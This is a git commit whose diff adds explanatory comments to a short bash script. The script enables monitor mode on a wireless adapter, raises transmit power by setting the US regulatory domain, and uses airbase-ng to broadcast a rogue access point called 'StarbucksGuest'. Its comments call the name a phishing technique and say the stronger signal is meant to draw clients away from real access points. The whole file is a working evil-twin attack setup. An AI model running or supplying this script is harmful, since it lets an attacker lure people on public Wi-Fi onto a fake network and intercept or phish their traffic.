d8dcde9085e166a22a9be61c9a4e300605327e28
David O'Mullan <35239651+davidomullan@users.noreply.github.com>
2018-12-05 13:16:50 -0500

    comments

--- 1.sh
+++ 1.sh
@@ -1,7 +1,10 @@
 #!/bin/bash
+#This file sets up the AP and boosts it to the highest US regulation
+#Most APs run at an "efficient" transmission power, so our AP should be a stronger signal
 sudo ifconfig wlx9cefd5fc329b up
 sudo airmon-ng start wlx9cefd5fc329b
 sudo ifconfig wlan0mon down
 sudo iw reg set US
 sudo ifconfig wlan0mon up
+#Using StarbucksGuest is a phishing technique, rather than copying the name of another AP
 sudo airbase-ng -e "StarbucksGuest" -c 1 wlan0mon
